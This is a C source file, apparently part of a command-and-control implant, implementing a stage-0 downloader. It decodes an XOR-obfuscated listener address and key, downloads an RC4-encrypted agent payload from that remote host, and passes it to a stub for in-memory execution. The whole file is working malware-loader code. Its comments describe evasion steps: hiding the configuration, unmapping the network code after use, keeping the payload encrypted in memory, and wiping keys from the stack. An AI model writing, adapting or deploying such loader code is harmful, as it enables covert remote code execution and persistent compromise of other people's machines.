#define _GNU_SOURCE
#include "packer.h"
#include "stage_abi.h"
#include "syscalls.h"
#include "transport.h"
#include "utils.h"

/* Configurable Options - from Makefile */
#ifndef ENCODED_HOST
#define ENCODED_HOST 0x00
#endif
#ifndef ENCODED_PORT
#define ENCODED_PORT 0x00
#endif
#ifndef ENCODED_PATH
#define ENCODED_PATH 0x00
#endif
#ifndef ENCODED_KEY
#define ENCODED_KEY 0x00
#endif
#ifndef CONFIG_XOR_KEY
#define CONFIG_XOR_KEY 0x5A
#endif
#ifndef MAX_STAGE_BLOB_SIZE
#define MAX_STAGE_BLOB_SIZE (40 * 1024 * 1024)
#endif

// XOR-encoded configuration arrays
static const unsigned char encoded_host[] = {ENCODED_HOST};
static const unsigned char encoded_port[] = {ENCODED_PORT};
static const unsigned char encoded_path[] = {ENCODED_PATH};
static const unsigned char encoded_key[] = {ENCODED_KEY};

/*
 * Downloader stage.
 *
 * This runs from a separately-mapped blob managed by the stub. It owns all of
 * the networking code and the encoded listener configuration; as soon as it
 * returns, the stub unmaps it, so none of that survives into the supervising
 * phase.
 *
 * On success res->data points at the downloaded agent PIC, still encrypted and
 * read/write, and res->key carries the RC4 key so the stub (or each supervised
 * child) can decrypt it into an RX view. The downloader never executes or
 * decrypts the payload itself.
 */
void downloader_main(struct download_result *res) {
  res->data = NULL;
  res->size = 0;

  char host[256];
  char port[16];
  char path[256];
  char key_str[256];
  uint8_t key[DERIVED_KEY_LEN];

  decode_config_string(host, encoded_host, sizeof(host));
  decode_config_string(port, encoded_port, sizeof(port));
  decode_config_string(path, encoded_path, sizeof(path));
  decode_config_string(key_str, encoded_key, sizeof(key_str));
  derive_key_from_string(key_str, key);

  debug_print("Stage0: Downloading Stage1 blob from %s:%s%s via %s\n", host,
              port, path, transport_name());

  /* Reserve the maximum payload size up front because the download length is
   * unknown until the transfer finishes. Anonymous pages are only backed when
   * written, so the untouched tail costs no physical memory; it is released
   * right after the download. */
  void *stage_blob =
      (void *)mmap(NULL, MAX_STAGE_BLOB_SIZE, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (stage_blob == MAP_FAILED) {
    debug_print("Stage0: mmap failed\n");
    return;
  }

  size_t downloaded_size = transport_download(host, port, path, stage_blob,
                                              MAX_STAGE_BLOB_SIZE, key);

  if (downloaded_size == 0) {
    debug_print("Stage0: download failed\n");
    munmap(stage_blob, MAX_STAGE_BLOB_SIZE);
    return;
  }

  // The blob is handed off exactly as received: the listener RC4-encrypts it
  // with the derived key (see buildServedBlob in core/lib/listener), and the
  // stub decrypts it only when a process is about to run it. Keeping it
  // ciphertext here means the long-lived parent never maps the agent PIC as
  // executable plaintext.
  size_t cipher_size = PAGE_ALIGN_UP(downloaded_size);

  /* Drop the unused reservation tail so the ciphertext mapping is only as
   * large as the payload. */
  if (cipher_size < MAX_STAGE_BLOB_SIZE)
    munmap((uint8_t *)stage_blob + cipher_size, MAX_STAGE_BLOB_SIZE - cipher_size);

  debug_print("Stage0: downloaded %d bytes, handing off to stub\n",
              (int)downloaded_size);
  res->data = (char *)stage_blob;
  res->size = downloaded_size;
  memcpy(res->key, key, sizeof(res->key));

  /* Only the stub's copy of the key must survive; wipe the downloader's stack
   * copies of the passphrase and key before the blob is unmapped. */
  memset(key, 0, sizeof(key));
  memset(key_str, 0, sizeof(key_str));
}

/*
 * Entry point of the downloader blob (offset 0). `jmp` (not `call`) keeps the
 * stub's return address and the result pointer in RDI untouched, so
 * downloader_main returns directly to the stub once it has the agent PIC.
 */
__asm__(".section .init,\"ax\",@progbits\n"
        ".global _start\n"
        "_start:\n"
        "jmp downloader_main\n");
